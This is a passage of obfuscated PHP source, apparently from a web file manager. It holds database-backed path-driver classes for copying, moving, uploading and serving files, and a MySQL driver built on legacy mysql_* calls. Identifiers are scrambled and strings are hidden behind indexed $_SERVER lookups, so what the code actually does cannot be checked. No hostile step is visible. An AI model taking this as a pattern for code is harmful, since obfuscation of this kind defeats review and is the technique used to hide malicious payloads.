$this->model = Model($_SERVER[¡“ËÌ§œ][1353]); } public function getPath($ÃÜªñ—è) { return trim($ÃÜªñ—è, $_SERVER[¡“ËÌ§œ][8]); } public function pathFather($ø‚Œœïş) { $¦šÑéÕù = $this->parse($ø‚Œœïş); $¦šÑéÕù = $this->infoSimple($ø‚Œœïş); return $¦šÑéÕù ? $¦šÑéÕù[$_SERVER[¡“ËÌ§œ][470]] : !1; } public function pathThis($Àº¦ÍÏ») { $æ™ÕÂÊğ = $this->infoSimple($Àº¦ÍÏ»); return $æ™ÕÂÊğ ? $æ™ÕÂÊğ[$_SERVER[¡“ËÌ§œ][32]] : !1; } public function getPathOuter($áâ­ºìç) { if (!$áâ­ºìç) { return $áâ­ºìç; } $ğ¢˜¨ò¹ = $this->parse($áâ­ºìç); return KodIO::make($ğ¢˜¨ò¹[$_SERVER[¡“ËÌ§œ][437]]); } public function copyFolderFromIO($ö¤»”Ú, $ó¹ú›º, $“¾ ÕÁì, $àîì±Ç, $ÂÅµ»Ô) { $–ìÀéäº = $this->model->copyFolderFromIO($ö¤»”Ú, $ó¹ú›º, $“¾ ÕÁì, $àîì±Ç, $ÂÅµ»Ô); return KodIO::make($–ìÀéäº); } public function isParentOf($Ÿ®£šûó, $Œß«¤±ø) { return $this->model->isParentOf($Ÿ®£šûó, $Œß«¤±ø); } public function mkfile($©ıÈ•˜µ, $üÙºÉ‘° = '', $Ú‚ˆ›¦³ = REPEAT_RENAME) { $ŒÄŸüŠÍ =& $_SERVER[¡“ËÌ§œ]; $Ï·°ˆÇÔ = $this->parse($©ıÈ•˜µ); $©ıÈ•˜µ = $Ï·°ˆÇÔ[$ŒÄŸüŠÍ[437]]; for ($Š¿ÛŠ¸ = 0; $Š¿ÛŠ¸ < count($Ï·°ˆÇÔ[$ŒÄŸüŠÍ[1354]]); $Š¿ÛŠ¸++) { $È§ÜçÃ = $Ï·°ˆÇÔ[$ŒÄŸüŠÍ[1354]][$Š¿ÛŠ¸]; if ($Š¿ÛŠ¸ == count($Ï·°ˆÇÔ[$ŒÄŸüŠÍ[1354]]) - 1) { $©ıÈ•˜µ = $this->model->mkfile($©ıÈ•˜µ, $È§ÜçÃ, $üÙºÉ‘°, $Ú‚ˆ›¦³); break; } $©ıÈ•˜µ = $this->model->mkdir($©ıÈ•˜µ, $È§ÜçÃ, REPEAT_SKIP); } return $this->getPathOuter($©ıÈ•˜µ); } public function mkdir($²­å¾š¢, $úÍˆ‰­ = REPEAT_SKIP) { $ÉİùÎ‡ =& $_SERVER[¡“ËÌ§œ]; $ø°÷ó· = $this->parse($²­å¾š¢); $²­å¾š¢ = $ø°÷ó·[$ÉİùÎ‡[437]]; for ($ĞÊ’çÂ = 0; $ĞÊ’çÂ < count($ø°÷ó·[$ÉİùÎ‡[1354]]); $ĞÊ’çÂ++) { $é¢åÃşı = $ø°÷ó·[$ÉİùÎ‡[1354]][$ĞÊ’çÂ]; $²­å¾š¢ = $this->model->mkdir($²­å¾š¢, $é¢åÃşı, $úÍˆ‰­); } return $this->getPathOuter($²­å¾š¢); } public function copyFile($¾£’èĞÀ, $ÌŒòºÍ­, $µÈÇçÖ· = REPEAT_REPLACE) { $­…Íöéù =& $_SERVER[¡“ËÌ§œ]; $®­ƒş¥ = $this->parse($ÌŒòºÍ­); $§Ä¥Ú¼ˆ = $this->model->copy($¾£’èĞÀ, $®­ƒş¥[$­…Íöéù[437]], $µÈÇçÖ·, $®­ƒş¥[$­…Íöéù[84]]); return $§Ä¥Ú¼ˆ ? $this->getPathOuter($§Ä¥Ú¼ˆ) : !1; } public function moveFile($å°Àëß, $Î¸öİ«É, $Èı“Æü˜ = REPEAT_REPLACE) { $İ¸Üß =& $_SERVER[¡“ËÌ§œ]; $ÂºÕäÙŠ = $this->parse($Î¸öİ«É); $Øò£¦ò  = $this->model->move($å°Àëß, $ÂºÕäÙŠ[$İ¸Üß[437]], $Èı“Æü˜, $ÂºÕäÙŠ[$İ¸Üß[84]]); return $Øò£¦ò  ? $this->getPathOuter($Øò£¦ò ) : !1; } public function copy($åË‡Ñù, $­ëâÑâº, $§€õÜ˜Ã = REPEAT_REPLACE, $üÍ½Ì’æ = false) { $ÍÙ«¡ù = $this->parse($­ëâÑâº); $²Ã¡Ñ½è = $this->model->copy($åË‡Ñù, $ÍÙ«¡ù[$_SERVER[¡“ËÌ§œ][437]], $§€õÜ˜Ã, $üÍ½Ì’æ); return $²Ã¡Ñ½è ? $this->getPathOuter($²Ã¡Ñ½è) : !1; } public function moveSameAllow() { } public function move($Ò³öŒú÷, $ÇøóØ‚ª, $ö’«†™Õ = REPEAT_REPLACE, $ÎÃûÆ¶ş = false) { $ÖíŸ»š = $this->parse($ÇøóØ‚ª); $‚ã‹ÉôÍ = $this->model->move($Ò³öŒú÷, $ÖíŸ»š[$_SERVER[¡“ËÌ§œ][437]], $ö’«†™Õ, $ÎÃûÆ¶ş); return $‚ã‹ÉôÍ ? $this->getPathOuter($‚ã‹ÉôÍ) : !1; } public function remove($¹ı¯éÓŞ, $¬ÍğÙí = true) { return $this->model->remove($¹ı¯éÓŞ, $¬ÍğÙí); } public function rename($ìœŞé³, $ğŸŠÜ‘…) { $ÈÈ²ÔàÁ = $this->model->rename($ìœŞé³, $ğŸŠÜ‘…); return $ÈÈ²ÔàÁ ? $this->getPathOuter($ìœŞé³) : $ÈÈ²ÔàÁ; } public function size($®ªÎìïÖ) { $Åß¨è = $this->infoSimple($®ªÎìïÖ); return $Åß¨è ? $Åß¨è[$_SERVER[¡“ËÌ§œ][76]] : 0; } public function infoSimple($…ï¤Ÿ´) { return $this->model->sourceInfo($…ï¤Ÿ´); } public function info($ô¹è—ë) { return $this->infoParse($ô¹è—ë); } public function infoAuth($ªöû‹ª‡) { return $this->infoParse($ªöû‹ª‡, !1, !0); } public function infoWithChildren($×Ğ†®ÕÃ) { return $this->infoParse($×Ğ†®ÕÃ, !0); } protected function infoParse($ûÖÚ²»Ú, $ñ´Àüıå = false, $Ù¹¡‹ºù = false) { if (!$ñ´Àüıå) { return $this->model->pathInfo($ûÖÚ²»Ú, $Ù¹¡‹ºù); } return $this->model->pathInfoMore($ûÖÚ²»Ú); } public function infoFull($ÑÛ¹ß†º) { $ƒ…Ÿ´úù =& $_SERVER[¡“ËÌ§œ]; $ˆÔÏñÖ¦ = explode($ƒ…Ÿ´úù[8], $ÑÛ¹ß†º); $èåşøää = implode($ƒ…Ÿ´úù[8], array_splice($ˆÔÏñÖ¦, 1)); return $this->model->pathInfoByPath($ˆÔÏñÖ¦[0], $èåşøää); } public function hashSimple($„ö£ˆ) { $¬¦ûÃª =& $_SERVER[¡“ËÌ§œ]; $Äû±ì„ = $this->infoWithChildren($„ö£ˆ); return $Äû±ì„[$¬¦ûÃª[170]][$¬¦ûÃª[177]]; } public function hashMd5($¼¸êÍòî) { $ì¶»Ì© =& $_SERVER[¡“ËÌ§œ]; $µÊŒÜ¤¨ = $this->infoWithChildren($¼¸êÍòî); return $µÊŒÜ¤¨[$ì¶»Ì©[170]][$ì¶»Ì©[176]]; } public function exist($Ä¹ïâ‹¨) { $ÕóÏÇÎ¥ =& $_SERVER[¡“ËÌ§œ]; $‚İç¼àİ = $this->parse($Ä¹ïâ‹¨); if (!$‚İç¼àİ[$ÕóÏÇÎ¥[84]]) { return $this->isFile($Ä¹ïâ‹¨) || $this->isFolder($Ä¹ïâ‹¨); } $ç©° “ = array($ÕóÏÇÎ¥[439] => $‚İç¼àİ[$ÕóÏÇÎ¥[437]], $ÕóÏÇÎ¥[32] => $‚İç¼àİ[$ÕóÏÇÎ¥[84]]); $¤ë§çû’ = $this->model->where($ç©° “)->find(); return $¤ë§çû’ ? !0 : !1; } public function isFile($ˆÉå¹•Ğ) { $”§½½Ùğ =& $_SERVER[¡“ËÌ§œ]; $Ÿñ¾¿Œ = $this->infoSimple($ˆÉå¹•Ğ); return $Ÿñ¾¿Œ && $Ÿñ¾¿Œ[$”§½½Ùğ[448]] == $”§½½Ùğ[88] ? !1 : !0; } public function isFolder($ó©ªˆÆƒ) { $Š†íà¢ =& $_SERVER[¡“ËÌ§œ]; $Çí––š· = $this->infoSimple($ó©ªˆÆƒ); return $Çí––š· && $Çí––š·[$Š†íà¢[448]] == $Š†íà¢[88] ? !0 : !1; } public function listPath($Ğ¥€õ˜ò, $µşË„¡í = false) { $…Ù…ëÆ =& $_SERVER[¡“ËÌ§œ]; if ($Ğ¥€õ˜ò == $…Ù…ëÆ[12]) { return !1; } $ÀüÛâú… = array($…Ù…ëÆ[439] => $Ğ¥€õ˜ò); if ($µşË„¡í) { return $this->model->listSource($ÀüÛâú…, -1); } return $this->model->listSource($ÀüÛâú…); } public function has($‡²’–òŸ, $‘ÍûĞ„ = false, $è÷ôªÜ = null) { $ÏÑÍ²Ïò =& $_SERVER[¡“ËÌ§œ]; $ôƒŸÙ«ê = $this->infoWithChildren($‡²’–òŸ); if ($‘ÍûĞ„) { return array($ÏÑÍ²Ïò[208] => $ôƒŸÙ«ê[$ÏÑÍ²Ïò[208]], $ÏÑÍ²Ïò[207] => $ôƒŸÙ«ê[$ÏÑÍ²Ïò[207]]); } return $è÷ôªÜ ? $ôƒŸÙ«ê[$ÏÑÍ²Ïò[208]] : $ôƒŸÙ«ê[$ÏÑÍ²Ïò[207]]; } public function listAll($­òƒ€µ©) { $“êà¶Ø´ = IO::info($this->pathParse[$_SERVER[¡“ËÌ§œ][84]]); if (!$“êà¶Ø´) { return array(); } return $this->model->listAll($­òƒ€µ©); } public function getContent($Î·×À§) { return $this->model->getContent($Î·×À§); } public function setContent($‘¿“Ô·, $‘Ï†©ÄĞ = '') { return $this->model->setContent($‘¿“Ô·, $‘Ï†©ÄĞ); } public function fileSubstr($‡ô¸îÀ‰, $Ã°äÄµÔ, $Œ©•ïÏš) { return $this->model->fileSubstr($‡ô¸îÀ‰, $Ã°äÄµÔ, $Œ©•ïÏš); } public function download($œâ…ÓÓÛ, $Õ“¬Ò«Ã = '') { $Ä­À»‰ = get_path_father($Õ“¬Ò«Ã); $×”ˆµ á = get_path_this($Õ“¬Ò«Ã); $ĞÚ¤Ş‡‚ = $this->model->fileInfoGet($œâ…ÓÓÛ); $Ñî¦•Û÷ = IO::copy($ĞÚ¤Ş‡‚[$_SERVER[¡“ËÌ§œ][84]], $Ä­À»‰, !1, $×”ˆµ á); return $Ñî¦•Û÷; } public function setModifyTime($½ÉÜŸçÒ, $Ò¼Ù¨ñĞ = '') { $ø©ØàÛ› =& $_SERVER[¡“ËÌ§œ]; if (!$½ÉÜŸçÒ) { return; } $this->model->where(array($ø©ØàÛ›[455] => $½ÉÜŸçÒ))->save(array($ø©ØàÛ›[85] => $Ò¼Ù¨ñĞ)); } public function upload($÷Ç»¼Ô¬, $úõüÑÒ, $°àÜáº = false, $ˆ¥Ÿ–ùú = REPEAT_REPLACE) { $ÑÙ€˜® =& $_SERVER[¡“ËÌ§œ]; $åœııø = $this->parse($÷Ç»¼Ô¬); $¨¡ó³ñ = $this->model->addFile($åœııø[$ÑÙ€˜®[437]], $úõüÑÒ, $åœııø[$ÑÙ€˜®[84]], $°àÜáº, $ˆ¥Ÿ–ùú); return $this->getPathOuter($¨¡ó³ñ); } public function uploadFileByID($—ñ¡°ãË, $˜Û³°‰, $ÔÃ¸Û©Ï) { $Ñ‰±çš§ =& $_SERVER[¡“ËÌ§œ]; $ÆÜç†¿ = $this->parse($—ñ¡°ãË); $ıê»ƒÍé = $this->model->addFileByFileID($ÆÜç†¿[$Ñ‰±çš§[437]], $˜Û³°‰, $ÆÜç†¿[$Ñ‰±çš§[84]], $ÔÃ¸Û©Ï); return $this->getPathOuter($ıê»ƒÍé); } public function addFileByRemote($ÏµİîÄ¦, $­à·æäÙ, $‹Àí’šƒ = array(), $€‘´øÍ¤ = '', $€öÊ€Åß) { $“Õ»èâŞ =& $_SERVER[¡“ËÌ§œ]; $íõÒƒà = $this->parse($ÏµİîÄ¦); $€‘´øÍ¤ = empty($€‘´øÍ¤) ? $íõÒƒà[$“Õ»èâŞ[84]] : $€‘´øÍ¤; $ä«†Á†è = $this->model->addFileByRemote($íõÒƒà[$“Õ»èâŞ[437]], $­à·æäÙ, $€‘´øÍ¤, $‹Àí’šƒ, $€öÊ€Åß); return $this->getPathOuter($ä«†Á†è); } public function uploadLink($°Õ¿ãĞâ, $¬¡çşóû = 0) { $ïàØÜ¥ =& $_SERVER[¡“ËÌ§œ]; $ú“úò”¶ = $this->parse($°Õ¿ãĞâ); $ôßÊ¢£ = _get($GLOBALS[$ïàØÜ¥[7]], $ïàØÜ¥[1355]); $¤Şèõº‹ = _get($GLOBALS[$ïàØÜ¥[7]], $ïàØÜ¥[1356]); $°Õ¿ãĞâ = Model($ïàØÜ¥[639])->createFileName($ú“úò”¶[$ïàØÜ¥[84]], $ôßÊ¢£, $¤Şèõº‹); return IO::uploadLink($°Õ¿ãĞâ, $¬¡çşóû); } public function fileNameAuto($öàãñ¢È, $µÖü¡¶ë, $Ò¹Ñ¤¢³ = REPEAT_REPLACE, $‚¡±Ë’– = false) { return $this->model->fileNameAuto($öàãñ¢È, $µÖü¡¶ë, $Ò¹Ñ¤¢³, $‚¡±Ë’–); } public function fileNameExist($Æ¦Àœì, $®¬¶óÇÊ) { return $this->model->fileNameExist($Æ¦Àœì, $®¬¶óÇÊ); } protected function _fileOut($Øı€¹ˆÖ, $©Ãşš°ˆ = false, $§úç«¼Æ = false, $æÙ€Â• = '', $¹ùË–…ò = false) { $¡óá—± =& $_SERVER[¡“ËÌ§œ]; $‹˜Œûßâ = $this->model->sourceInfo($Øı€¹ˆÖ); if ($‹˜Œûßâ[$¡óá—±[448]] == $¡óá—±[88]) { header($¡óá—±[1357]); die; } $Ãê²ßİ = $this->model->fileInfoGet($Øı€¹ˆÖ); $æÙ€Â• = $Ãê²ßİ[$¡óá—±[176]] ? $Ãê²ßİ[$¡óá—±[176]] : $æÙ€Â•; $ˆØÖ¦ôÌ = isset($GLOBALS[$¡óá—±[1358]]) ? $GLOBALS[$¡óá—±[1358]] : $‹˜Œûßâ[$¡óá—±[32]]; if ($¹ùË–…ò) { return IO::fileOutServer($Ãê²ßİ[$¡óá—±[84]], $©Ãşš°ˆ, $ˆØÖ¦ôÌ, $æÙ€Â•); } IO::fileOut($Ãê²ßİ[$¡óá—±[84]], $©Ãşš°ˆ, $ˆØÖ¦ôÌ, $æÙ€Â•); } public function fileOut($…á¹á¢, $ô»ßö´ = false, $×îÓş¼… = false, $·àüª÷Ğ = '') { $this->_fileOut($…á¹á¢, $ô»ßö´, $×îÓş¼…, $·àüª÷Ğ); } public function fileOutServer($À›ÊÁŸ, $·ÊÓĞÉã = false, $òô«ßº§ = false, $ãå¾¥’“ = '') { $this->_fileOut($À›ÊÁŸ, $·ÊÓĞÉã, $òô«ßº§, $ãå¾¥’“, !0); } protected function _fileOutImage($ı­’¨ÁÑ, $óĞğ°ì = 250) { $Û•ªÑ¢Ê =& $_SERVER[¡“ËÌ§œ]; $Œ¾Û²ñ = $this->model->pathInfo($ı­’¨ÁÑ); if ($Œ¾Û²ñ[$Û•ªÑ¢Ê[448]] == $Û•ªÑ¢Ê[88]) { show_json($Û•ªÑ¢Ê[1359] . $ı­’¨ÁÑ, !1); } $†«›Ö” = $this->model->fileInfoGet($ı­’¨ÁÑ); $†«›Ö”[$Û•ªÑ¢Ê[32]] = $Œ¾Û²ñ[$Û•ªÑ¢Ê[32]]; $†«›Ö”[$Û•ªÑ¢Ê[169]] = $Œ¾Û²ñ[$Û•ªÑ¢Ê[169]]; $GLOBALS[$Û•ªÑ¢Ê[1358]] = $†«›Ö”[$Û•ªÑ¢Ê[32]]; $GLOBALS[$Û•ªÑ¢Ê[168]] = $†«›Ö”; IO::fileOutImage($†«›Ö”[$Û•ªÑ¢Ê[84]], $óĞğ°ì); } public function fileOutImage($““ÙÏªÎ, $‚õƒ¿•– = 250) { $this->_fileOutImage($““ÙÏªÎ, $‚õƒ¿•–); } public function fileOutImageServer($â‡ ¿²Ú, $Í€Æ¡Û‡ = 250) { $this->_fileOutImage($â‡ ¿²Ú, $Í€Æ¡Û‡); } public function link($ô²°³ºÓ, $À»İ§Ï¹ = '') { $®Û•É³° = $this->model->fileInfoGet($ô²°³ºÓ); return IO::link($®Û•É³°[$_SERVER[¡“ËÌ§œ][84]], $À»İ§Ï¹); } protected function parse($çšœ¤à¼) { $ÀÇã±–Ò =& $_SERVER[¡“ËÌ§œ]; if (strstr($çšœ¤à¼, $ÀÇã±–Ò[8]) === !1) { return array($ÀÇã±–Ò[457] => intval($çšœ¤à¼), $ÀÇã±–Ò[84] => $ÀÇã±–Ò[12], $ÀÇã±–Ò[1354] => array()); } $œ¢ü¢Îú = explode($ÀÇã±–Ò[8], trim($çšœ¤à¼, $ÀÇã±–Ò[8])); if (count($œ¢ü¢Îú) < 2) { show_tips(clear_html($çšœ¤à¼) . $ÀÇã±–Ò[1360]); } return array($ÀÇã±–Ò[457] => intval($œ¢ü¢Îú[0]), $ÀÇã±–Ò[84] => $œ¢ü¢Îú[1], $ÀÇã±–Ò[1354] => array_slice($œ¢ü¢Îú, 1)); } } class PathDriverDbShareItem extends PathDriverDB { public function __construct($˜‡¹à¸) { $this->pathParse = $˜‡¹à¸; $this->model = Model($_SERVER[¡“ËÌ§œ][1353]); } public function getPathOuter($¹µœ¨‚–) { $ô³ŠĞœ± =& $_SERVER[¡“ËÌ§œ]; if (!$¹µœ¨‚–) { return $¹µœ¨‚–; } $ç±­“¬ = $this->parse($¹µœ¨‚–); return trim(KodIO::makeShare($this->pathParse[$ô³ŠĞœ±[437]], $ç±­“¬[$ô³ŠĞœ±[437]]), $ô³ŠĞœ±[8]); } protected function infoParse($Ş âØÍ’, $â¸Àñ» = false, $¡À·Ğ³¾ = false) { $ÀŞ¶ùÈ =& $_SERVER[¡“ËÌ§œ]; $“ô…öÕ¬ = $this->pathParse[$ÀŞ¶ùÈ[437]]; $ÕÛ¢“ÜŒ = trim($this->pathParse[$ÀŞ¶ùÈ[1188]], $ÀŞ¶ùÈ[8]); return Action($ÀŞ¶ùÈ[1361])->sharePathInfo($“ô…öÕ¬, $ÕÛ¢“ÜŒ, $â¸Àñ»); } public function infoFull($Êé©ºƒÆ) { $ÛËï©¼Ö =& $_SERVER[¡“ËÌ§œ]; $Ã•—šôï = explode($ÛËï©¼Ö[8], trim($Êé©ºƒÆ, $ÛËï©¼Ö[8])); if (count($Ã•—šôï) > 1) { $‡òƒíƒü = implode($ÛËï©¼Ö[8], array_splice($Ã•—šôï, 1)); $Ø´ÌË¨ô = $this->model->pathInfoByPath($Ã•—šôï[0], $‡òƒíƒü); if (!$Ø´ÌË¨ô) { return !1; } $this->pathParse[$ÛËï©¼Ö[1188]] = $Ø´ÌË¨ô[$ÛËï©¼Ö[440]]; } return $this->infoParse($Êé©ºƒÆ); } public function listAll($Ä•Å¬¸¹) { $ãç¸…üÈ =& $_SERVER[¡“ËÌ§œ]; $ıîœç’ = IO::info($this->pathParse[$ãç¸…üÈ[84]]); if (!$ıîœç’) { return array(); } $ãí‚ŸÕ† = $this->model->listAll($Ä•Å¬¸¹); $÷ıÊÓ¬‘ = Model($ãç¸…üÈ[630])->getInfo($ıîœç’[$ãç¸…üÈ[631]]); foreach ($ãí‚ŸÕ† as &$Şœ¬á¿Û) { check_abort(); $Şœ¬á¿Û[$ãç¸…üÈ[87]] = Action($ãç¸…üÈ[1361])->_shareItemeParse($Şœ¬á¿Û[$ãç¸…üÈ[87]], $÷ıÊÓ¬‘); } unset($Şœ¬á¿Û); return $ãí‚ŸÕ†; } } class PathDriverDbShareLink extends PathDriverDB { public function __construct($ìÚ‚ƒÙ) { $this->pathParse = $ìÚ‚ƒÙ; $this->model = Model($_SERVER[¡“ËÌ§œ][1353]); } protected function infoParse($‘“ë³Ë, $Ò»¢±üÉ = false, $Òô›°Òü = false) { $ÂÎØÄ½Ê =& $_SERVER[¡“ËÌ§œ]; return Action($ÂÎØÄ½Ê[1194])->sharePathInfo($this->pathParse[$ÂÎØÄ½Ê[84]], !0, $Ò»¢±üÉ); } public function listPath($¥Š“¬¦‘, $ËÑ®·¯æ = false) { $šä¯‡ñä =& $_SERVER[¡“ËÌ§œ]; $ğ¨¶õğ» = parent::listPath($¥Š“¬¦‘, $ËÑ®·¯æ); if (!$ğ¨¶õğ») { return $ğ¨¶õğ»; } if (is_array($ğ¨¶õğ»[$šä¯‡ñä[1362]])) { $ğ¨¶õğ»[$šä¯‡ñä[1362]] = Action($šä¯‡ñä[1194])->shareItemInfo($ğ¨¶õğ»[$šä¯‡ñä[1362]]); } foreach ($ğ¨¶õğ» as $ğö¨¤ëì => $ßŸˆöÏ) { if (!in_array($ğö¨¤ëì, array($šä¯‡ñä[83], $šä¯‡ñä[82]))) { continue; } foreach ($ßŸˆöÏ as $šÔàÉÙ => $Â£ÍğŸ) { $ğ¨¶õğ»[$ğö¨¤ëì][$šÔàÉÙ] = Action($šä¯‡ñä[1194])->shareItemInfo($Â£ÍğŸ); } } return $ğ¨¶õğ»; } public function listAll($ÕØëÕ©÷) { $×¼Î‰Ë =& $_SERVER[¡“ËÌ§œ]; $•è‰ÕŒõ = IO::info($this->pathParse[$×¼Î‰Ë[84]]); if (!$•è‰ÕŒõ) { return array(); } $º¦÷ÜÁÍ = $this->model->listAll($ÕØëÕ©÷); foreach ($º¦÷ÜÁÍ as &$’¸‹¦Åç) { $’¸‹¦Åç[$×¼Î‰Ë[87]] = Action($×¼Î‰Ë[1194])->shareItemInfo($’¸‹¦Åç[$×¼Î‰Ë[87]]); } unset($’¸‹¦Åç); return $º¦÷ÜÁÍ; } } goto A·´‘õ©è; Dè…î±»ã: class DbMysql extends Db { public function __construct($üºíø³” = '') { $¦§ƒÖøå =& $_SERVER[¡“ËÌ§œ]; if (!extension_loaded($¦§ƒÖøå[824])) { think_exception(think_lang($¦§ƒÖøå[14]) . $¦§ƒÖøå[905]); } if (!empty($üºíø³”)) { $this->config = $üºíø³”; if (empty($this->config[$¦§ƒÖøå[17]])) { $this->config[$¦§ƒÖøå[17]] = $¦§ƒÖøå[12]; } } } public function connect($¼²‘Šø = '', $şÕ­©–ß = 0, $Û×Ú„– = false) { $ÊäÒ­èÌ =& $_SERVER[¡“ËÌ§œ]; if (!isset($this->linkID[$şÕ­©–ß])) { if (empty($¼²‘Šø)) { $¼²‘Šø = $this->config; } $êèÜ¹õŒ = $¼²‘Šø[$ÊäÒ­èÌ[906]] . ($¼²‘Šø[$ÊäÒ­èÌ[907]] ? "\72{$¼²‘Šø[$ÊäÒ­èÌ[907]]}" : $ÊäÒ­èÌ[12]); $¾¦ò™Œ™ = !empty($¼²‘Šø[$ÊäÒ­èÌ[17]][$ÊäÒ­èÌ[18]]) ? $¼²‘Šø[$ÊäÒ­èÌ[17]][$ÊäÒ­èÌ[18]] : $this->pconnect; if ($¾¦ò™Œ™) { $this->linkID[$şÕ­©–ß] = mysql_pconnect($êèÜ¹õŒ, $¼²‘Šø[$ÊäÒ­èÌ[908]], $¼²‘Šø[$ÊäÒ­èÌ[909]], 131072); } else { $this->linkID[$şÕ­©–ß] = mysql_connect($êèÜ¹õŒ, $¼²‘Šø[$ÊäÒ­èÌ[908]], $¼²‘Šø[$ÊäÒ­èÌ[909]], !0, 131072); } if (!$this->linkID[$şÕ­©–ß] || !empty($¼²‘Šø[$ÊäÒ­èÌ[21]]) && !mysql_select_db($¼²‘Šø[$ÊäÒ­èÌ[21]], $this->linkID[$şÕ­©–ß])) { think_exception(mysql_error()); } $¯ªÔ†¥˜ = mysql_get_server_info($this->linkID[$şÕ­©–ß]); mysql_query($ÊäÒ­èÌ[910] . think_config($ÊäÒ­èÌ[911]) . $ÊäÒ­èÌ[58], $this->linkID[$şÕ­©–ß]); if ($¯ªÔ†¥˜ > $ÊäÒ­èÌ[912]) { mysql_query($ÊäÒ­èÌ[913], $this->linkID[$şÕ­©–ß]); } $this->connected = !0; if (1 != think_config($ÊäÒ­èÌ[22])) { unset($this->config); } } return $this->linkID[$şÕ­©–ß]; } public function free() { mysql_free_result($this->queryID); $this->queryID = null; } public function query($ªç¤òñÖ) { $ŸíøéÍÁ =& $_SERVER[¡“ËÌ§œ]; if (0 === stripos($ªç¤òñÖ, $ŸíøéÍÁ[293])) { $this->close(); $this->connected = !1; } $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $ªç¤òñÖ; if ($this->queryID) { $this->free(); } think_action_status($ŸíøéÍÁ[23], 1); think_status($ŸíøéÍÁ[24]); $this->queryID = mysql_query($ªç¤òñÖ, $this->_linkID); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = mysql_num_rows($this->queryID); return $this->getAll(); } } public function execute($šÇ£ú) { $­¤ìÔ×¸ =& $_SERVER[¡“ËÌ§œ]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $šÇ£ú; if ($this->queryID) { $this->free(); } think_action_status($­¤ìÔ×¸[25], 1); think_status($­¤ìÔ×¸[24]); $å™›¾®¤ = mysql_query($šÇ£ú, $this->_linkID); $this->debug(); if (!1 === $å™›¾®¤) { $this->error(); return !1; } else { $this->numRows = mysql_affected_rows($this->_linkID); $this->lastInsID = mysql_insert_id($this->_linkID); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { mysql_query($_SERVER[¡“ËÌ§œ][914], $this->_linkID); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $«…Àï²ó = mysql_query($_SERVER[¡“ËÌ§œ][915], $this->_linkID); $this->transTimes = 0; if (!$«…Àï²ó) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $ÂİÓé½‚ = mysql_query($_SERVER[¡“ËÌ§œ][916], $this->_linkID); $this->transTimes = 0; if (!$ÂİÓé½‚) { $this->error(); return !1; } } return !0; } private function getAll() { $ŞÈˆîòÆ = array(); if ($this->numRows > 0) { while ($ıê…Ú¥‰ = mysql_fetch_assoc($this->queryID)) { $ŞÈˆîòÆ[] = $ıê…Ú¥‰; } mysql_data_seek($this->queryID, 0); } return $ŞÈˆîòÆ; } public function getFields($ÃÎø©òØ) { $æëîÚç =& $_SERVER[¡“ËÌ§œ]; $úÖ®Æ§ª = $this->query($æëîÚç[917] . $this->parseKey($ÃÎø©òØ)); $Š˜ø¸’» = array(); if ($úÖ®Æ§ª) { foreach ($úÖ®Æ§ª as $Ç¸˜İ× => $­ÛÌ£Ü) { $Š˜ø¸’»[$­ÛÌ£Ü[$æëîÚç[31]]] = array($æëîÚç[32] => $­ÛÌ£Ü[$æëîÚç[31]], $æëîÚç[33] => $­ÛÌ£Ü[$æëîÚç[34]], $æëîÚç[35] => (bool) (strtoupper($­ÛÌ£Ü[$æëîÚç[36]]) === $æëîÚç[918]), $æëîÚç[37] => $­ÛÌ£Ü[$æëîÚç[38]], $æëîÚç[39] => strtolower($­ÛÌ£Ü[$æëîÚç[40]]) == $æëîÚç[41], $æëîÚç[42] => strtolower($­ÛÌ£Ü[$æëîÚç[43]]) == $æëîÚç[44]); } } return $Š˜ø¸’»; } public function getTables($ÎˆÖÃÔÇ = '') { $úÑÕ¿“™ =& $_SERVER[¡“ËÌ§œ]; if (!empty($ÎˆÖÃÔÇ)) { $©¸§Œ× = $úÑÕ¿“™[919] . $ÎˆÖÃÔÇ . $úÑÕ¿“™[920]; } else { $©¸§Œ× = $úÑÕ¿“™[921]; } $á…“×‘ = $this->query($©¸§Œ×); $•¸‹Øİ¾ = array(); foreach ($á…“×‘ as $åŒ‡¹—Ô => $Óööâ´) { $•¸‹Øİ¾[$åŒ‡¹—Ô] = current($Óööâ´); } return $•¸‹Øİ¾; } public function replace($¾ÙÇªØÊ, $§İ¾¨ß¤ = array()) { $ÑŸ‡Ù—‘ =& $_SERVER[¡“ËÌ§œ]; foreach ($¾ÙÇªØÊ as $šçúëï => $Â€¨¿¦) { $ôî‰ÖÜ = $this->parseValue($Â€¨¿¦); if (is_scalar($ôî‰ÖÜ)) { $í®îğ [] = $ôî‰ÖÜ; $»ÍÒœª×[] = $this->parseKey($šçúëï); } } $»ì²šì¬ = $ÑŸ‡Ù—‘[922] . $this->parseTable($§İ¾¨ß¤[$ÑŸ‡Ù—‘[308]]) . $ÑŸ‡Ù—‘[923] . implode($ÑŸ‡Ù—‘[50], $»ÍÒœª×) . $ÑŸ‡Ù—‘[924] . implode($ÑŸ‡Ù—‘[50], $í®îğ ) . $ÑŸ‡Ù—‘[925]; return $this->execute($»ì²šì¬); } public function insertAll($´”Ş±¼…, $üêğ§½¹ = array(), $²¾›¸ß = false) { $Ü³ˆŸÏ =& $_SERVER[¡“ËÌ§œ]; if (!is_array($´”Ş±¼…[0])) { return !1; } $Õ÷Í÷ã = array_keys($´”Ş±¼…[0]); $óéô¸­à = array(); foreach ($´”Ş±¼… as $˜ Ë®ô”) { $ãå¯à€ = array(); foreach ($˜ Ë®ô” as $§ø …Î => $ıíØ¸ÎÕ) { $ıíØ¸ÎÕ = $this->parseValue($ıíØ¸ÎÕ); if (is_scalar($ıíØ¸ÎÕ)) { $ãå¯à€[] = $ıíØ¸ÎÕ; } } $óéô¸­à[] = $Ü³ˆŸÏ[289] . implode($Ü³ˆŸÏ[50], $ãå¯à€) . $Ü³ˆŸÏ[925]; } array_walk($Õ÷Í÷ã, array($this, $Ü³ˆŸÏ[926])); $Îİ´Á = ($²¾›¸ß ? $Ü³ˆŸÏ[927] : $Ü³ˆŸÏ[928]) . $Ü³ˆŸÏ[929] . $this->parseTable($üêğ§½¹[$Ü³ˆŸÏ[308]]) . $Ü³ˆŸÏ[923] . implode($Ü³ˆŸÏ[50], 